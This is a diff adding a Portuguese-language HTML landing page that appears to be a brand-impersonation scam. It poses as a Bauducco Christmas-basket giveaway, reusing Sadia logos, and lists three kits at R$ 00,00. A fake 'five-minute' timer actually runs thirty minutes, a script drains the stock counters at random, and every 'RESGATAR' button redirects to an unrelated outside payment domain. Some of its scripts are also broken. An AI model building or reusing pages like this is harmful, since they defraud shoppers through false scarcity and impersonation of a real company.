@@ -1,0 +1,493 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Kits de Natal 2025 — Bauducco</title>
+
+<!-- Fontes e Ícones -->
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/all.min.css">
+ 
+  <!-- Fontes e ícones -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+ <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-17510961501"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-17510961501');
+  </script>
+<style>
+:root {
+  --yellow: #f6c200;
+  --red: #c70000;
+  --dark: #222;
+  --gray: #777;
+  --radius: 14px;
+  --container: 1100px;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Montserrat', sans-serif;
+  background: #fff;
+  color: var(--dark);
+}
+
+/* ===== CABEÇALHO ===== */
+header {
+  background: var(--yellow);
+  padding: 14px 20px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+}
+.header-inner {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  max-width: var(--container);
+  margin: 0 auto;
+}
+.header-left i,
+.header-right i {
+  font-size: 22px;
+  color: var(--dark);
+  cursor: pointer;
+  margin-right: 12px;
+}
+.header-left i:last-child,
+.header-right i:last-child {
+  margin-right: 0;
+}
+.header-center img {
+  height: 48px;
+  display: block;
+}
+
+/* ===== BANNER ===== */
+.banner {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 28px auto;
+  padding: 0 15px;
+  max-width: 1200px;
+}
+.banner img {
+  width: 100%;
+  max-width: 1200px;
+  border-radius: 18px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.15);
+  object-fit: cover;
+}
+
+/* ===== TEXTO PRINCIPAL ===== */
+.content {
+  max-width: var(--container);
+  margin: 0 auto;
+  padding: 20px;
+  text-align: center;
+}
+.content h1 {
+  font-size: 20px;
+  margin-top: 10px;
+  color: var(--dark);
+}
+.content p {
+  color: var(--gray);
+  font-size: 14px;
+  margin-top: 8px;
+  line-height: 1.5;
+}
+
+/* ===== KITS ===== */
+.kits {
+  max-width: var(--container);
+  margin: 40px auto 60px;
+  padding: 0 20px;
+}
+.kits h2 {
+  font-size: 22px;
+  font-weight: 700;
+  margin-bottom: 25px;
+  text-align: center;
+  color: var(--dark);
+}
+.kits-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
+  gap: 26px;
+}
+.kit {
+  background: #fff;
+  border-radius: var(--radius);
+  overflow: hidden;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  position: relative;
+}
+.kit:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 22px rgba(0,0,0,0.12);
+}
+.kit img {
+  width: 100%;
+  height: 200px;
+  object-fit: cover;
+}
+.kit-content {
+  padding: 18px;
+  text-align: center;
+}
+.kit-content h3 {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--red);
+  margin-bottom: 8px;
+}
+.kit-content p {
+  font-size: 14px;
+  color: var(--gray);
+  margin-bottom: 12px;
+}
+.price {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--dark);
+  margin-bottom: 12px;
+  position: relative;
+}
+.original-price {
+  text-decoration: line-through;
+  color: #999;
+  font-size: 14px;
+  font-weight: normal;
+  display: block;
+}
+.current-price {
+  color: #c70000;
+  font-size: 22px;
+}
+button.resgatar {
+  background: var(--red);
+  color: #fff;
+  border: none;
+  border-radius: 25px;
+  font-weight: 600;
+  padding: 10px 28px;
+  font-size: 15px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+  width: 100%;
+}
+button.resgatar:hover {
+  background: #a60000;
+}
+button.resgatar:disabled {
+  background: #cccccc;
+  cursor: not-allowed;
+}
+
+/* Contador de disponibilidade */
+.availability {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 10px 0;
+  font-size: 14px;
+  color: #666;
+}
+.availability i {
+  margin-right: 5px;
+  color: #c70000;
+}
+.availability span {
+  font-weight: bold;
+  margin-left: 5px;
+}
+
+/* ===== RESPONSIVO ===== */
+@media (max-width: 768px) {
+  .header-center img {
+    height: 40px;
+  }
+  .banner img {
+    border-radius: 0;
+  }
+  .kit img {
+    height: 170px;
+  }
+}
+
+.content {
+  max-width: 900px;
+  margin: 40px auto 60px;
+  padding: 0 20px;
+  text-align: center;
+}
+.content .title {
+  font-size: 24px;
+  font-weight: 800;
+  color: #b30000;
+  margin-bottom: 10px;
+  text-transform: uppercase;
+}
+.content .subtitle {
+  color: #333;
+  font-size: 15px;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+.content .warning {
+  color: #444;
+  font-size: 14px;
+  line-height: 1.6;
+  margin-top: 20px;
+  background: #fff4cc;
+  padding: 14px;
+  border-left: 5px solid #c70000;
+  border-radius: 8px;
+}
+
+/* Timer box */
+.timer-box {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  background: #c70000;
+  color: #fff;
+  border-radius: 50px;
+  padding: 10px 24px;
+  font-size: 16px;
+  font-weight: 600;
+  box-shadow: 0 4px 12px rgba(199,0,0,0.25);
+}
+.timer-box .icon {
+  margin-right: 10px;
+  font-size: 18px;
+}
+#countdown {
+  font-weight: 800;
+}
+</style>
+</head>
+
+<body>
+<header>
+  <div class="header-inner">
+    <div class="header-left">
+      <i class="fas fa-bars"></i>
+      <i class="fas fa-search"></i>
+    </div>
+    <div class="header-center">
+      <img src="images/KitseCommerceSadiaLogo.webp" alt="Logo Sadia Kits 2025">
+    </div>
+    <div class="header-right">
+      <i class="fas fa-user"></i>
+      <i class="fas fa-heart"></i>
+      <i class="fas fa-shopping-bag"></i>
+    </div>
+  </div>
+</header>
+
+<section class="banner">
+  <img src="images/kit.webp" alt="Banner Sadia Kits 2025">
+</section>
+
+<section class="content">
+  <h1 class="title">Parabéns! Você garantiu seu Kit de Natal Bauducco exclusivo</h1>
+  <p class="subtitle">
+    Escolha o seu kit abaixo e clique em <strong>“Resgatar”</strong>. Depois, finalize seu pedido informando o endereço de entrega — simples, rápido e seguro.
+  </p>
+
+  <div class="timer-box">
+    <i class="fas fa-clock icon"></i>
+    <div class="timer-text">
+      Oferta válida pelos próximos <span id="countdown">05:00</span> minutos.
+    </div>
+  </div>
+
+  <p class="warning">
+    Os kits são extremamente limitados e a demanda está alta. Garanta o seu agora mesmo e tenha um Natal completo com os produtos Bauducco.
+  </p>
+</section>
+
+<section class="kits">
+  <h2>Escolha seu kit:</h2>
+  <div class="kits-grid">
+
+    <div class="kit">
+      <img src="images/bassi.webp" alt="Kit Sadia Bassi">
+      <div class="kit-content">
+        <h3>Cesta de Natal Pequena Bauducco</h3>
+        <p>Peso do Kit: 1,910 kg.<br>Serve até 15 pessoas.<br>Caixa com 6 unidades.</p>
+        <div class="price">
+          <span class="original-price">R$ 599,80</span>
+          <span class="current-price">R$ 00,00</span>
+        </div>
+        <div class="availability">
+          <i class="fas fa-box"></i> Restam apenas <span id="kit-bassi-count">32</span> unidades
+        </div>
+<button class="resgatar" onclick="window.location.href='https://pay.areadepagamento.digital/checkout/bfbb67cc-ed0b-429c-8e25-e92a85bf42af'">
+  RESGATAR
+</button>
+      </div>
+    </div>
+
+    <div class="kit">
+      <img src="images/harmonia.webp" alt="Kit Harmonia Sadia">
+      <div class="kit-content">
+        <h3>Cesta de Natal Grande Bauducco</h3>
+        <p>Peso do Kit: 1,580 kg.<br>Serve até 13 pessoas.<br>Caixa com 3 unidades.</p>
+        <div class="price">
+          <span class="original-price">R$ 419,00</span>
+          <span class="current-price">R$ 00,00</span>
+        </div>
+        <div class="availability">
+          <i class="fas fa-box"></i> Restam apenas <span id="kit-harmonia-count">28</span> unidades
+        </div>
+<button class="resgatar" onclick="window.location.href='https://pay.areadepagamento.digital/checkout/bfbb67cc-ed0b-429c-8e25-e92a85bf42af'">
+  RESGATAR
+</button>
+      </div>
+    </div>
+
+    <div class="kit">
+      <img src="images/gloria.webp" alt="Kit Glória Sadia">
+      <div class="kit-content">
+        <h3>Cesta de Natal PP Bauducco</h3>
+        <p>Peso do Kit: 1,265 kg.<br>Serve até 13 pessoas.<br>Caixa com 6 unidades.</p>
+        <div class="price">
+          <span class="original-price">R$ 799,90</span>
+          <span class="current-price">R$ 00,00</span>
+        </div>
+        <div class="availability">
+          <i class="fas fa-box"></i> Restam apenas <span id="kit-gloria-count">23</span> unidades
+        </div>
+<button class="resgatar" onclick="window.location.href='https://pay.areadepagamento.digital/checkout/bfbb67cc-ed0b-429c-8e25-e92a85bf42af'">
+  RESGATAR
+</button>
+      </div>
+    </div>
+    </div>
+
+  
+</section>
+<script>
+ // ===============================
+ // Timer regressivo de 5 minutos
+ // ===============================
+let tempo = 30 * 60; // segundos
+const countdownEl = document.getElementById("countdown");
+
+function atualizarTimer() {
+  const minutos = Math.floor(tempo / 60);
+  const segundos = tempo % 60;
+  countdownEl.textContent =
+    `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+
+  if (tempo > 0) {
+    tempo--;
+  } else {
+    clearInterval(intervalo);
+    countdownEl.textContent = "00:00";
+    countdownEl.style.color = "#ffdf00";
+  }
+}
+
+const intervalo = setInterval(atualizarTimer, 1000);
+atualizarTimer();
+
+// ===============================
+// Estoque dos kits
+// ===============================
+const kits = {
+  bassi: { 
+    element: document.getElementById('kit-bassi-count'), 
+    count: 32 
+  },
+  harmonia: { 
+    element: document.getElementById('kit-harmonia-count'), 
+    count: 28 
+  },
+  gloria: { 
+    element: document.getElementById('kit-gloria-count'), 
+    count: 23 
+  }
+};
+
+// ===============================
+// Diminuição automática de estoque
+// ===============================
+function diminuirEstoque() {
+  const kitKeys = Object.keys(kits);
+  const kitAleatorio = kitKeys[Math.floor(Math.random() * kitKeys.length)];
+
+  if (kits[kitAleatorio].count > 0) {
+    kits[kitAleatorio].count--;
+    kits[kitAleatorio].element.textContent = kits[kitAleatorio].count;
+
+    if (kits[kitAleatorio].count === 0) {
+      const btn = document.querySelector(`button[data-kit="${kitAleatorio}"]`);
+      btn.disabled = true;
+      btn.textContent = "ESGOTADO";
+    }
+  }
+
+  const proximoIntervalo = Math.floor(Math.random() * 2000) + 1000;
+  setTimeout(diminuirEstoque, proximoIntervalo);
+}
+
+setTimeout(diminuirEstoque, 1500);
+
+// ===============================
+// Captura UTMs da URL
+// ===============================
+function getUTMParams() {
+  return window.location.search; // ?utm_source=FB&utm_campaign=...
+}
+
+// ===============================
+// Botões de resgate
+// ===============================
+document.querySelectorAll('.resgatar').forEach(button => {
+  button.addEventListener('click', function() {
+    const kit = this.getAttribute('data-kit');
+    if (kits[kit].count > 0) {
+      const kitContainer = this.closest('.kit-content');
+
+      const precoAtual = kitContainer.querySelector('.current-price').textContent.trim();
+      const precoRabiscado = kitContainer.querySelector('.original-price') 
+                            ? kitContainer.querySelector('.original-price').textContent.trim()
+                            : '';
+
+      const kitData = {
+        nome: kitContainer.querySelector('h3').textContent.trim(),
+        estoque: kits[kit].count,
+        preco: precoAtual,
+        precoOriginal: precoRabiscado
+      };
+
+      // Monta a query string com dados do kit
+      const params = new URLSearchParams();
+      params.set('nome', kitData.nome);
+      params.set('estoque', kitData.estoque);
+      params.set('preco', kitData.preco);
+      params.set('precoOriginal', kitData.precoOriginal);
+
+      // Adiciona UTMs da URL atual
+      const utms = getUTMParams();
+      const redirectURL = `./checkout.html?${params.toString()}${utms ? '&' + utms.slice(1) : ''}`;
+
+      // Redireciona para checkout.html com dados e UTMs
+      window.location.href = redirectURL;
+    }
+  });
+});
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body><!-- Mirrored from kitsbauducco.vercel.app/escolha/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Nov 2025 04:47:10 GMT --></html>
